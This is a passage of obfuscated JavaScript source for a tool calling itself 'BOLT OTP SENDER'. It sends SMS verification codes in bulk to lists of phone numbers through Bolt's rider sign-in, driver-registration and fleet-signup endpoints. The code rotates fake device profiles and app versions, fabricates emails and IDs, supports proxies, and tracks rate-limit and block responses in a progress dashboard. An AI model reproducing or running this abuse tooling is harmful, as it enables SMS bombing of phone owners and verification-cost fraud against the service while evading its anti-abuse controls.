"rKX1zq", "sLb2Dq", "mJi2", "Bg9N", "AwzPyW", "yxbW", "jsb8ia", "BMqGiG", "cLjLCW", "ywTOrW", "BxKTtq", "ignVDq", "r0nnxW", "uxDsza", "DfvfvW", "AxvTia", "DwTWrW", "mZu0", "vvjdrq", "Bg9Vza", "zgvjua", "s0THrq", "v2LUmW", "t1jfEq", "rvPcCa", "cLvsta", "mJuY", "rKLsAq", "C20TvW", "BuzHyq", "oKvdra", "DeT1sq", "igj5ia", "zuPlDW", "yxiTwq", "Ew5htW", "AgfIBa", "wxLdsa", "BgLUzq", "qK1Mqq", "BM5LBa", "DgfSBa", "CM9Syq", "zKLTCW", "zM9Yrq", "uxr2rW", "AxqTvG", "BvPwrW", "Dgviyq", "rLfxBG", "yK1yqq", "zxnZzG", "lMv1", "y3b1CW", "z01VqW", "t3jTBa", "CgjmsW", "zsbHBa", "rhvsCG", "shP2BG", "y2LLCW", "uhjLBq", "mJeZ", "BwLU", "u2LNBG", "t2jUvq", "Be9mAa", "mJy1", "lNr4Da", "AKPnzq", "CeHguq", "t1rqxq", "txLvyG", "y3vZDa", "zcb0Aa", "luffuW", "yLbcqG", "EMT2yG", "wNH4Eq", "wMHuqq", "ufn6uq", "mZu3", "mJG3otnmtuDIrfq", "zxmTrq", "zKLzvG", "AuTZEG", "icaG", "AKH1qq", "C2f2zq", "zg1PkW", "Dxr2wG", "tevurq", "teTiDW", "DhzoBa", "tLD5Ea", "qwnwDq", "rhHfqG", "CMvTzq", "sNP4Eq", "verUuq", "rcbiqq", "D2LUmW", "tgLmBa", "tw96Aq", "DgPbtW", "y2HPBa", "zK9zDW", "EMDiCq", "uLborq", "C3rLBG", "v0zWDW", "C2vOrW", "sfHcCa", "vf0GwW", "4Pwq4PwDcG", "ENLSEq", "zguTra", "tw5qCG", "s3zXyG", "BgLezq", "D0LNuW", "EhPIyG", "uuzSqG", "mI9Nzq", "txzszG", "uNH0ra", "C2SGlq", "DgvYia", "y0Hbyq", "uMrivW", "x1nftG", "AhKNia", "DhDVCG", "BMuTtG", "BfbtqG", "A05xAG", "CIbUDq", "icHlsa", "Fe9uua", "y1jxqW", "icOOpW", "nJC4", "zxiGBG", "yxiTsq", "wxHiBG", "mJiW", "zguTta", "icbnBW", "Bezyua", "xsbuBW", "keDLDa", "wMXLua", "yNL0zq", "A2v5Ca", "zs5IBW", "g1SYsG", "x2TLEq", "C2X3yW", "DLn5ra", "qxfWzW", "Ce1zvG", "A05gza", "ihjHBG", "CM5XzG", "zguG", "vLzWzW", "ifn0yq", "otCZ", "mxWYFa", "zNiTrW", "yM9SDa", "vM9SDq", "z29VzW", "C2LtBq", "y2uGka", "lIbfEa", "uLKGxq", "y29UCW", "xsbezq", "s2LUzW", "Aw5NlG", "Aw9U", "A21O", "lMv1lW", "igrVDW", "qtiWlq", "CMfUzW", "x2nOyq", "BLjbzG", "zxjZrG", "mti2oa", "zcbMCG", "y0P1za", "iokaLcbO", "AxrLza", "lunPBq", "tfrkAW", "yxiTsG", "txHuDW", "ywXHEa", "twfRzq", "FgjVBa", "icdILzRILza", "mYaG4Ocu", "zxiGEq", "B0nXuq", "EfLnwG", "CxvLDq", "ssaGia", "zxiGqG", "zxnZ", "D2nLEq", "t2nHra", "AgP0BW", "BMHuuW", "AgvYia", "Dg9mBW", "B25Lia", "mZuZ", "BxmTtq", "BMXVyq", "A25uvq", "EhHkCq", "CKXAAa", "zgPorG", "BIaOna", "CKLKoW", "wujjra", "A0PkEG", "iokgKIa", "vw5WCG", "zxvL", "AwXL", "ntaY", "qvbjia", "CMf0Aq", "D2vYqW", "mtG2oq", "icPCka", "Cu5NBq", "BgLNAa", "DgvTua", "sfLJBq", "B2jQzq", "mJK3", "qNrutW", "yIKGlq", "yxbPsW", "t1Hjyq", "zhzXAa", "C0TvCG", "mKXNBq", "idePlG", "ntzFrW", "CuvnqG", "r21NCG", "u1D4tG", "A28TsW", "Cw5tyW", "q09nua", "yMzWrG", "vvDMwq", "q1bSCq", "zNiTta", "i0zgnG", "yNmTqG", "zxjYBW", "zMfPBa", "uKXPrq", "zwv0tW", "z3jLCW", "teT6BG", "C29JAW", "icGVCa", "nJG4", "DfXdCG", "lufNzq", "u0DPvW", "v3HcvW", "AwqGmG", "mZCW", "vtDqyW", "EevhyG", "jg1Nia", "zw50lq", "C3nMDq", "A3KTsW", "wvrYta", "AwzfCW", "zu9IAG", "CMLMAq", "BgzeCa", "zgvK", "mdaWma", "uNHsta", "EMGTsa", "D2DgDW", "mhW1Fa", "tezHvW", "uLn2tq", "vvritW", "tM8Sia", "y29UyW", "rKD2qG", "rKjura", "ksKUlG", "veXVwa", "CKfJDa", "ANbODa", "zw4Uia", "wuLHsG", "AgLZiG", "DgKTrq", "mZC4", "DNvdBa", "AhuTsa", "yMXVyW", "BMSGpq", "tfPIuq", "zNHKEG", "Avjyvq", "Bsbozq", "zhvXrW", "Dc9MBa", "tgL3za", "C1jqCa", "v1DAzq", "ywn0Aq", "ihnLyW", "mM0G", "vxnLia", "nJKX", "ChjVDG", "ru5yra", "CefvwG", "4PAi4Pwrica", "C2vYDG", "A2PTqW", "tw90BW", "sxzpEq", "Aw4ZmG", "rMnOqW", "C2WTuW", "u0eTqq", "ruqGlW", "DNz2qG", "CMSRoa", "AxqTuW", "DcbMBW", "BLPTtq", "B3qGzW", "r1zUrW", "CeLWCW", "C3zqEa", "z0Xqza", "y1vjvW", "AMvJzW", "EMGTva", "q2vnsG", "BKjYAq", "l3yYpW", "tgPwta", "Dg1dAq", "rLrfrq", "svj1vG", "CuLyAa", "B25Uzq", "Afrlzq", "yujsvq", "BKDiEa", "ntKX", "BxjfCG", "DMKTvG", "CYb1BG", "A2fHzq", "CM4GDa", "wwvZla", "D2fYzq", "yxLkwG", "mZC1", "ywrLza", "y2PSvG", "y2f0Aq", "uKvhsq", "q0zRsG", "twjXtG", "AMeTsG", "Bg1LBq", "mL9qCG", "Ahr0Ca", "B1fMwq", "DhHWEG", "rMjsrW", "B2nRDG", "mJm3", "wKTdqG", "qtC0", "zw5Zzq", "mJqZ", "ELrtzG", "y2vFBG", "ywqGzG", "BNrLCG", "oIbnAq", "y2vFBW", "mJm2", "DgvZ", "D0LWvq", "B3iOiG", "CMvHza", "uvLesW", "pt09kW", "zsb2zq", "mJy0", "uMjkDG", "t3bWBW", "luvYCG", "ChqTuW", "q29UzG", "s2LUuG", "C3bSAq", "zxi7ia", "rMfZDa", "mJuZ", "k0zUnW", "AeTezq", "wujNuW", "zw5LCG", "zcaGia", "EMXPyG", "t3jPzW", "Dw5NrW", "BNrYEq", "C2HAwq", "mJm0", "yMuTqG", "Dcbbua", "mtGYoq", "zxiGmq", "icdILAdILza", "z2XVyG", "lti1nG", "qKr2sq", "oYbxAq", "ENnJua", "AK5WtG", "u0vsvG", "vxfUAa", "zxnLBG", "nJC0", "qLfcqW", "kdqWma", "A1bcqq", "teLftW", "AKLtyW", "CMf0zq", "zxn0ia", "B3vYia", "uuLYra", "B3j0zq", "rLb3sa", "we93sG", "AwqTsq", "DI9UDq", "mJuX", "DhjPBG", "D3n6Da", "veXtxW", "DwWUDa", "nZaW", "E30UyW", "CgLWzq", "ENn0yW", "Eg9SBa", "teDmEq", "B1zfsa", "B1b3ra", "vxnLza", "4P6Cg1SZ", "z2DLCG", "uuHKBG", "zw4Ttq", "sKLSuG", "4Psm4Psa4Psa4Psa", "uwLWAq", "rhvesq", "C01uCW", "uMvNAq", "w251Bq", "wLnutW", "Egz4DG", "icaG4PYx", "wxjdva", "ue9tva", "y29UqW", "r3v4qW", "BLvVra", "BNrPBG", "AKTytW", "vwTSCq", "y3vWqG", "Dg8Tva", "CMvZzq", "B2LK", "vNfcvG", "zxiGCG", "sfaUmq", "Exb0BW", "Dg90yq", "vw5Yzq", "zM9YBq", "zcbWAa", "w0zmrq", "otu5", "B2rL", "DhbssW", "CgHVBG", "Euvbsq", "zxiGmG", "zxHLyW", "wfHywa", "CMvWzq", "senhEa", "zvzkzG", "EhrSua", "rwDiuq", "DMvYCW", "AwnL", "DvbTrW", "r1bRsa", "mJqW", "ihbLCG", "Dg9Y", "v0jxwq", "DMHhEa", "v2rVCG", "oty2", "Bhv2sW", "zgzMwG", "BM8GCG", "ievYCG", "rwjpwq", "AwDNzq", "4PAi4PAi4Pwx4PAi", "Avvqtq", "CMqGlq", "CerfqG", "ANf0rq", "Bwnguq", "D29YAW", "iejpta", "mIaG4Ocu", "u19dsa", "vxLLtG", "CYbHBG", "vvvfrW", "Aw5HBa", "Agn2EG", "EhK6ia", "Cfj5CW", "CNvLkq", "ywXqAq", "ChbVCG", "DgLVBG", "Dxb6Cq", "tM90ia", "BgX5iq", "DwSTvq", "BM9uyW", "C3qTta", "ksGGkq", "ExDYCa", "ywDL", "vuCGuW", "4PAi4PwxiokwIa", "suzJqW", "Cgz0rW", "ueLmuG", "tJbzBq", "mtmUma", "otCW", "uMvTBW", "DhntEq", "BLb5BG", "EuLnuG", "zwqGCW", "CgfZCW", "rfzqtG", "C2XPyW", "q0zwqq", "zw4TuW", "t056sG", "Dhbitq", "lsbctW", "zxqTsq", "tgPjBa", "mJK3nZm5mMrjrg9IDq", "mJm1", "yM9Sza", "yxLita", "zNvUyW", "rhjHCq", "wwvZ", "otC1", "mtq0mq", "CurfEq", "v0DNAG", "CMvUza", "t1nNta", "A0L4Ea", "ruPQsq", "mc4WlG", "mtKZoq", "ntaX", "EsaO", "zgLNzq", "zvb4ta", "qxPiDa", "tLDXEa", "qvPZuW", "DgCTva", "wg13tW", "y3b1la", "BMrLBG", "CMvHyW", "ywWGka", "qNbuAG", "DgvYBG", "ChqTqW", "vgzdtG", "zw5XDq", "qNDHwG", "tgzpyG", "nJGX", "ENPzBq", "DhfTDq", "icHLlG", "otK2", "jgnWDq", "twPrzG", "zhbVAq", "r1Hqyq", "BenVDq", "z3bmqG", "ihWG", "C2fIBa", "C1Dmsa", "qNjHBG", "4PAi4Pwxica", "ywfgEa", "CwfXBq", "zxmTtq", "CxrPvq", "iokaLcbb", "Cg93zq", "BKfzra", "Aw5WDq", "mZuY", "wwPeqW", "sfjfqq", "AwnLBG", "rvntsq", "seeZoa", "yxiTuW", "tM8GAa", "sufeAG", "BuHota", "wvv0yW", "y3rYBa", "CM9TAq", "ifjftq", "ncK6", "rKfPyG", "zwjlAq", "ywjuua", "AKffEG", "C2n6Aa", "De1wtW", "zsbUBW", "EwvZ", "wgfTCG", "DMvY", "zwfZzq", "C01xtq", "reLsrq", "y3rLza", "igLUDG", "AKDtBG", "surnvq", "cIaG4Pwu", "oty0", "zMLSzq", "igDLDa", "vuPQyW", "AwnHDa", "zgvMBa", "nxWX", "uKuG4Ocu", "DJ0Imq", "ufDRtW", "CfbZsW", "AM1ruG", "zw4TqG", "BhvZtG", "CZOVlW", "CI4Grq", "wgvmDq", "zfHRAq", "B1DYqW", "Afj0ua", "xsbozq", "zLHdzW", "q2rrtG", "y2vjza", "B24UBa", "mJy3", "iezSzq", "yxDnBW", "ihzLCG", "BNb6CW", "C2LN", "zcbRzq", "B3DUqW", "y2vjra", "DhWXlG", "Dwfqta", "vxnLCG", "ts1tsa", "ChqTtq", "uLLjCa", "DMuGCW", "t2vXua", "g1Ti", "B2nLCW", "mLz3qq", "qNvPBa", "C2zpvG", "y09QCq", "wMf2ta", "wwPICW", "B24VCW", "wejozW", "seDLra", "swnXDG", "otK4", "tKXAwa", "wMXjzq", "mtq5lG", "mti0nG", "DuLbrq", "Dw1Izq", "zM8TrG", "u3LUyW", "ywDvsG", "v1DiCW", "rfDbuG", "De5qyq", "zw4Tva", "z3vMEa", "zxmTqq", "icGOja", "yw5KCG", "B2rLia", "t3byCa", "ugf0Aa", "DwnJzq", "mJbFua", "i0zgqq", "zujVyq", "yvzNzG", "C1PpqG", "AgnXqW", "zwHVsG", "rKztsq", "zuzRtG", "AMfYqG", "AwrKzq", "qKHSqW", "4PAi4Pwu4PwD4PAi", "mJi0", "Aw5Ozq", "wvHLzW", "DcaTrG", "qw1hCG", "uIbtrq", "ntK3", "zxHPDa", "xYrDwW", "BMnVza", "uKfssa", "DxiTua", "t2zxtG", "BNrSEq", "kcGOlG", "mJyX", "EK1PrG", "DgLYvq", "tvP4sq", "BgvUDa", "sffkDa", "svneqW", "yxrL", "Bg9NAq", "rMLSDa", "BNn0yq", "z2LbtW", "zxmTra", "zezqCG", "sefdsa", "D2rtsq", "u0HbmG", "4Pwq4Pwq4PwD4PwA", "zw4TvG", "DK9pAW", "EeT6qW", "lu9uua", "mJKW", "Afjhvq", "yvzIqG", "l21HyW", "nJC5", "yxiTqq", "A1bMAq", "ruPPva", "tvvKDG", "Efjmzq", "icD8jW", "CKDNuG", "C2v0Dq", "vefIza", "vurpDa", "CvDrCW", "i0zgra", "s2zSBG", "zuLsta", "zw5JBW", "r3rJuq", "DMfSAq", "4PscifVIGki", "jgrLDG", "otCX", "CNPdqW", "uK5wrq", "mteUma", "zKvuEq", "zwDPCW", "ssblzq", "D2rZta", "EKr1BW", "CMvK", "rKrsDG", "sKXAzq", "u2fgza", "BMv0DW", "CM9YoG", "vMP5Da", "yKvkuW", "sw5ZDa", "B2XdtW", "Dgf0Dq", "DMvYAq"];
  fn1 = function () {
    return _0xa50ad2;
  };
  return fn1();
}
v13.name = "RealmC21";
v13.os = "11";
const BOLT_DEVICES = [{
  name: "XiaomiRedmi+Note+4",
  os: "10"
}, {
  name: "XiaomiRedmi+Note+9",
  os: "11"
}, {
  name: "XiaomiRedmi+Note+10",
  os: "11"
}, {
  name: "SamsungGalaxy+A32",
  os: "11"
}, {
  name: "SamsungGalaxy+A52",
  os: "12"
}, {
  name: "SamsungGalaxy+A12",
  os: "10"
}, {
  name: "OppoA54",
  os: "11"
}, {
  name: "OppoA74",
  os: "11"
}, {
  name: "TecnoSpark+8",
  os: "11"
}, {
  name: "TecnoSpark+7P",
  os: "10"
}, {
  name: "ItelA56",
  os: "10"
}, v13, {
  name: "HuaweiY9s",
  os: "10"
}, {
  name: "NokiaG21",
  os: "12"
}, {
  name: "MotorolaMoto+G31",
  os: "11"
}, {
  name: "VivoY21",
  os: "11"
}, {
  name: "OnePlusNord+CE",
  os: "12"
}, {
  name: "SamsungGalaxy+M12",
  os: "11"
}, {
  name: "XiaomiRedmi+10",
  os: "12"
}, {
  name: "SamsungGalaxy+A13",
  os: "12"
}];
const BOLT_VERSIONS = ["CA.210.0", "CA.211.0", "CA.212.0", "CA.213.0", "CA.214.0", "CA.215.0", "CA.216.0", "CA.217.0", "CA.218.0", "CA.219.0", "CA.220.0"];
const randomDevice = () => BOLT_DEVICES[Math.floor(Math.random() * BOLT_DEVICES.length)];
const randomVersion = () => BOLT_VERSIONS[Math.floor(Math.random() * BOLT_VERSIONS.length)];
function buildBoltBody(_0x2c72a8) {
  return JSON.stringify({
    type: "phone",
    phone_number: _0x2c72a8,
    password: crypto.randomUUID(),
    last_known_state: {
      opened_product: {
        product: "taxi"
      }
    },
    timezone: "UTC",
    device_installed_apps: [],
    method: "sms",
    android_hash_string: "WdpiXhIekmh",
    alternative_channel: "sms",
    font_size: {
      scale: 1
    },
    flow_type: "sign_in"
  });
}
async function triggerBoltApp(_0x314068, _0x77c7b4 = {}) {
  const {
    onStatus = () => {},
    timeout = 20000,
    proxy = null
  } = _0x77c7b4;
  const _0x1302ed = normalizePhoneNumber(_0x314068);
  const _0x292d1e = _0x1302ed.replace("+", "");
  const _0x58b52d = getCountryFromPhone(_0x292d1e);
  const _0x22f820 = getLanguageFromCountry(_0x58b52d);
  const _0x19f325 = crypto.randomUUID();
  const _0x2ffde0 = crypto.randomUUID();
  const _0x7c4e7c = _0x19f325 + "u" + Math.floor(Date.now() / 1000);
  const _0x1fa473 = _0x19f325 + "u" + Date.now();
  const _0x3ed012 = buildBoltQueryParams(_0x19f325, _0x1fa473, _0x2ffde0, _0x7c4e7c, _0x58b52d);
  const _0x4c630c = buildBoltBody(_0x1302ed);
  const _0x4edb70 = "https://user.live.boltsvc.net/profile/verification/start/v2?" + _0x3ed012;
  const _0x59de81 = {
    "Content-Type": "application/json; charset=UTF-8",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.12.0",
    Connection: "keep-alive"
  };
  onStatus("[App] SMS OTP → " + _0x1302ed + " [" + _0x58b52d.toUpperCase() + "]");
  try {
    const _0x3eccbb = await sendRequest(_0x4edb70, "POST", _0x59de81, _0x4c630c, proxy, timeout);
    const _0x167083 = _0x3eccbb.data;
    if (_0x3eccbb.status === 200) {
      try {
        {
          const _0x2fd5cf = JSON.parse(_0x167083);
          if (_0x2fd5cf.code === 0 && _0x2fd5cf.data && _0x2fd5cf.data.login_state) {
            const _0x30ca12 = _0x2fd5cf.data.login_state.verification_channel || "sms";
            const _0x45cde2 = {
              success: true,
              message: "App OTP via " + _0x30ca12,
              phone: _0x1302ed,
              channel: _0x30ca12,
              api: "App"
            };
            return _0x45cde2;
          }
          if (_0x2fd5cf.code !== undefined && _0x2fd5cf.code !== 0) {
            return {
              success: false,
              message: "API code " + _0x2fd5cf.code + ": " + (_0x2fd5cf.message || ""),
              phone: _0x1302ed
            };
          }
        }
      } catch (_0x317440) {}
      if (_0x167083.includes("\"code\":0")) {
        return {
          success: true,
          message: "App OTP triggered",
          phone: _0x1302ed,
          api: "App"
        };
      }
    }
    return {
      success: false,
      message: classifyError(_0x3eccbb.status, _0x167083),
      phone: _0x1302ed
    };
  } catch (_0x54a49a) {
    {
      const _0x26e70e = {
        success: false,
        message: "Network: " + _0x54a49a.message,
        phone: _0x1302ed
      };
      return _0x26e70e;
    }
  }
}
async function triggerBoltDriver(_0xf03dbc, _0x1e720c = {}) {
  const {
    onStatus = () => {},
    timeout = 20000,
    proxy = null
  } = _0x1e720c;
  const _0x279eed = normalizePhoneNumber(_0xf03dbc);
  const _0x2c0249 = _0x279eed.replace("+", "");
  const _0x56d2e0 = getCountryFromPhone(_0x2c0249);
  const _0x59bf8c = getLanguageFromCountry(_0x56d2e0);
  const _0x12325d = {
    version: "HP.1.22.93",
    device_name: "HP",
    device_os_version: "web",
    deviceId: "web",
    deviceType: "web",
    language: _0x59bf8c
  };
  const _0x4bc19e = new URLSearchParams(_0x12325d).toString();
  const _0x2102bd = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration?" + _0x4bc19e;
  const _0x511cb0 = JSON.stringify({
    email: "user" + Date.now() + "@bolt.eu",
    phone: _0x279eed,
    city_id: 1988,
    terms_consent_accepted: 1
  });
  const _0x41638d = {
    "Content-Type": "application/json",
    Accept: "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    Origin: "https://bolt.eu",
    Referer: "https://bolt.eu/",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
  };
  onStatus("[Driver] OTP → " + _0x279eed + " [" + _0x56d2e0.toUpperCase() + "]");
  try {
    {
      const _0x42ae8b = await sendRequest(_0x2102bd, "POST", _0x41638d, _0x511cb0, proxy, timeout);
      const _0x168726 = _0x42ae8b.data;
      if (_0x42ae8b.status === 200) {
        try {
          const _0x123033 = JSON.parse(_0x168726);
          if (_0x123033.code === 0 || _0x168726.includes("\"code\":0")) {
            return {
              success: true,
              message: "Driver OTP triggered",
              phone: _0x279eed,
              api: "Driver"
            };
          }
          if (_0x123033.code !== undefined && _0x123033.code !== 0) {
            return {
              success: false,
              message: "Driver API code " + _0x123033.code + ": " + (_0x123033.message || ""),
              phone: _0x279eed
            };
          }
        } catch (_0x4fc56f) {}
        const _0x4a22c7 = {
          success: true,
          message: "Driver OTP triggered",
          phone: _0x279eed,
          api: "Driver"
        };
        if (_0x168726.includes("\"code\":0")) {
          return _0x4a22c7;
        }
      }
      return {
        success: false,
        message: classifyError(_0x42ae8b.status, _0x168726),
        phone: _0x279eed
      };
    }
  } catch (_0x455efc) {
    {
      const _0x1663db = {
        success: false,
        message: "Network: " + _0x455efc.message,
        phone: _0x279eed
      };
      return _0x1663db;
    }
  }
}
async function triggerBoltFleet(_0x133145, _0x3873cb = {}) {
  const {
    onStatus = () => {},
    timeout = 20000,
    proxy = null
  } = _0x3873cb;
  const _0x4ac2e8 = normalizePhoneNumber(_0x133145);
  const _0x38149a = _0x4ac2e8.replace("+", "");
  const _0x2d6070 = getCountryFromPhone(_0x38149a);
  const _0x179558 = getLanguageFromCountry(_0x2d6070);
  const _0x41b5ab = "visitor-fleet-" + crypto.randomUUID();
  const _0x515077 = {
    version: "HP.1.22.93",
    device_name: "HP",
    device_os_version: "web",
    deviceId: "web",
    deviceType: "web",
    language: _0x179558
  };
  const _0x3b0e84 = new URLSearchParams(_0x515077).toString();
  const _0x1c48a4 = "https://fleetownerportal.live.boltsvc.net/fleetOwnerPortal/startSignup?" + _0x3b0e84;
  const _0x4a5f22 = JSON.stringify({
    email: "user" + Date.now() + "@bolt.eu",
    phone: _0x4ac2e8,
    fleet_size: "1 - 10",
    terms_consent_accepted: 1,
    visitor_id: _0x41b5ab
  });
  const _0x1e5507 = {
    "Content-Type": "application/json",
    Accept: "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    Origin: "https://bolt.eu",
    Referer: "https://bolt.eu/",
    "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"
  };
  onStatus("[Fleet] OTP → " + _0x4ac2e8 + " [" + _0x2d6070.toUpperCase() + "]");
  try {
    {
      const _0x1bfc86 = await sendRequest(_0x1c48a4, "POST", _0x1e5507, _0x4a5f22, proxy, timeout);
      const _0x307d39 = _0x1bfc86.data;
      if (_0x1bfc86.status === 200) {
        try {
          const _0x4d81a3 = JSON.parse(_0x307d39);
          if (_0x4d81a3.code === 0 || _0x307d39.includes("\"code\":0")) {
            return {
              success: true,
              message: "Fleet OTP triggered",
              phone: _0x4ac2e8,
              api: "Fleet"
            };
          }
          if (_0x4d81a3.code !== undefined && _0x4d81a3.code !== 0) {
            return {
              success: false,
              message: "Fleet API code " + _0x4d81a3.code + ": " + (_0x4d81a3.message || ""),
              phone: _0x4ac2e8
            };
          }
        } catch (_0x1ca10f) {}
        const _0x2470f1 = {
          success: true,
          message: "Fleet OTP triggered",
          phone: _0x4ac2e8,
          api: "Fleet"
        };
        if (_0x307d39.includes("\"code\":0")) {
          return _0x2470f1;
        }
      }
      return {
        success: false,
        message: classifyError(_0x1bfc86.status, _0x307d39),
        phone: _0x4ac2e8
      };
    }
  } catch (_0x4882f8) {
    {
      const _0x104be3 = {
        success: false,
        message: "Network: " + _0x4882f8.message,
        phone: _0x4ac2e8
      };
      return _0x104be3;
    }
  }
}
function classifyError(_0x1c359e, _0xa18c53) {
  let _0x743ec9 = "HTTP " + _0x1c359e;
  if (_0x1c359e === 429) {
    _0x743ec9 = "Rate Limited (429)";
  }
  if (_0x1c359e === 403) {
    _0x743ec9 = "Forbidden (403)";
  }
  if (_0x1c359e === 400) {
    _0x743ec9 = "Bad Request (400)";
  }
  if (_0x1c359e === 422) {
    _0x743ec9 = "Unprocessable (422)";
  }
  if (_0xa18c53.includes("invalid_phone")) {
    _0x743ec9 = "Invalid Phone";
  }
  if (_0xa18c53.includes("rate_limit")) {
    _0x743ec9 = "Rate Limited";
  }
  if (_0xa18c53.includes("blocked")) {
    _0x743ec9 = "Number Blocked";
  }
  if (_0xa18c53.includes("unsupported_country")) {
    _0x743ec9 = "Country Not Supported";
  }
  return _0x743ec9;
}
const v22 = {
  fn: triggerBoltApp,
  name: "App"
};
const v23 = {
  fn: triggerBoltDriver,
  name: "Driver"
};
const v24 = {
  fn: triggerBoltFleet,
  name: "Fleet"
};
const API_FUNCS = [v22, v23, v24];
let _mixedIdx = 0;
async function triggerOtpAuto(_0x607bdb, _0x25cd47 = {}) {
  const _0x50fc4c = _0x25cd47.apiMode || "app";
  let _0x26519b;
  if (_0x50fc4c === "mixed") {
    _0x26519b = API_FUNCS[_mixedIdx % API_FUNCS.length].fn;
    _mixedIdx++;
  } else if (_0x50fc4c === "driver") {
    _0x26519b = triggerBoltDriver;
  } else if (_0x50fc4c === "fleet") {
    _0x26519b = triggerBoltFleet;
  } else {
    _0x26519b = triggerBoltApp;
  }
  return _0x26519b(_0x607bdb, _0x25cd47);
}
if (isMainThread) {
  class Dashboard {
    constructor(_0x1137bc) {
      const _0x57a05f = "4|0|1|2|3".split("|");
      {
        this.totalNumbers = _0x1137bc;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    addLog(_0x247d1d, _0x3cbf6a) {
      let _0xaf5290 = _0x3cbf6a === "success" ? B("[BOLT] [OTP SENT]") : _0x3cbf6a === "retry" ? Y("[RETRY ]") : R("[ERROR ]");
      process.stdout.write("\r[K" + _0xaf5290 + " " + _0x247d1d + "\n");
      this.render();
    }
    setStatus(_0x2339cc) {}
    render() {
      const _0x1d769e = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1);
      const _0x155608 = "  " + W.bold("BOLT-OTP") + " >> [" + this.processed + "/" + this.totalNumbers + "] " + _0x1d769e + "% | " + B("Sent: " + this.successful) + " | " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + _0x155608);
    }
    stop() {
      process.stdout.write("[2K\r\n");
      const _0x108282 = Math.floor((Date.now() - this.startTime) / 1000);
      const _0x44754b = Math.floor(_0x108282 / 60);
      const _0x43547b = _0x108282 % 60;
      const _0x5ef528 = _0x44754b + "m " + _0x43547b + "s";
      console.log(B("  +============================================+"));
      console.log(B("  |") + W.bold("  BOLT OTP SENDER - COMPLETE                ") + B("|"));
      console.log(B("  +============================================+"));
      console.log(B("  |") + ("  " + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + B("|"));
      console.log(B("  |") + ("  " + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + B("|"));
      console.log(B("  |") + ("  " + chalk.cyan("Total Time") + "   " + chalk.cyan(_0x5ef528.padEnd(6)) + "                       ") + B("|"));
      console.log(B("  +============================================+\n"));
    }
  }
  async function selectOption(_0x1803a5, _0x44046d) {
    return new Promise(_0x49f981 => {
      {
        let _0x205186 = 0;
        process.stdin.resume();
        readline.emitKeypressEvents(process.stdin);
        if (process.stdin.isTTY) {
          process.stdin.setRawMode(true);
        }
        const _0x712562 = () => {
          process.stdout.write("[2J[H");
          printHeader();
          console.log("   [33m" + _0x1803a5 + "[0m\n");
          _0x44046d.forEach((_0x2cef52, _0x1ea5d0) => {
            {
              if (_0x1ea5d0 === _0x205186) {
                console.log("   [36m➜[32m " + _0x2cef52.name + "[0m");
              } else {
                console.log("     [90m" + _0x2cef52.name + "[0m");
              }
            }
          });
        };
        _0x712562();
        const _0x2e5d1c = (_0x234eb8, _0xcc2e52) => {
          if (_0xcc2e52.ctrl && _0xcc2e52.name === "c") {
            process.exit(0);
          }
          if (_0xcc2e52.name === "up") {
            _0x205186 = (_0x205186 - 1 + _0x44046d.length) % _0x44046d.length;
            _0x712562();
          } else if (_0xcc2e52.name === "down") {
            _0x205186 = (_0x205186 + 1) % _0x44046d.length;
            _0x712562();
          } else if (_0xcc2e52.name === "return") {
            process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", _0x2e5d1c);
            _0x49f981(_0x44046d[_0x205186].value);
          }
        };
        process.stdin.on("keypress", _0x2e5d1c);
      }
    });
  }
  async function promptText(_0x556602, _0x137bd3) {
    return new Promise(_0x3df70c => {
      {
        process.stdout.write("   [33m" + _0x556602 + "[0m ");
        let _0xa8c1b5 = "";
        if (process.stdin.isTTY) {
          process.stdin.setRawMode(false);
        }
        process.stdin.resume();
        const _0x4f05c8 = _0x15548b => {
          const _0x31f1fc = _0x15548b.toString();
          if (_0x31f1fc.includes("\n") || _0x31f1fc.includes("\r")) {
            process.stdin.removeListener("data", _0x4f05c8);
            _0xa8c1b5 += _0x31f1fc.split(/[\r\n]/)[0];
            let _0x4b2064 = _0xa8c1b5.trim();
            if (_0x4b2064.startsWith("\"") && _0x4b2064.endsWith("\"") || _0x4b2064.startsWith("'") && _0x4b2064.endsWith("'")) {
              _0x4b2064 = _0x4b2064.slice(1, -1);
            }
            _0x3df70c(_0x4b2064 || _0x137bd3);
          } else {
            _0xa8c1b5 += _0x31f1fc;
          }
        };
        process.stdin.on("data", _0x4f05c8);
      }
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H");
    printHeader();
    console.log(W.bold("  --- BOLT OTP SENDER SETUP ---\n"));
    const _0x11a67d = await selectOption("SELECT NUMBER SOURCE", [{
      name: "📁 Load from file (numbers.txt)",
      value: "file"
    }, {
      name: "🌐 Auto fetch from NexaOTP Panel",
      value: "nexa"
    }]);
    let _0xaac770 = "numbers.txt";
    let _0x45b021 = null;
    if (_0x11a67d === "nexa") {
      let _0x2abf0d = "";
      if (fs.existsSync(NEXA_KEY_FILE)) {
        _0x2abf0d = fs.readFileSync(NEXA_KEY_FILE, "utf8").trim();
        const _0x2700bf = await selectOption("Saved NexaOTP Key (" + _0x2abf0d.substring(0, 10) + "...) found", [{
          name: "Use saved key",
          value: "use"
        }, {
          name: "Enter new key",
          value: "new"
        }, {
          name: "Remove saved key",
          value: "remove"
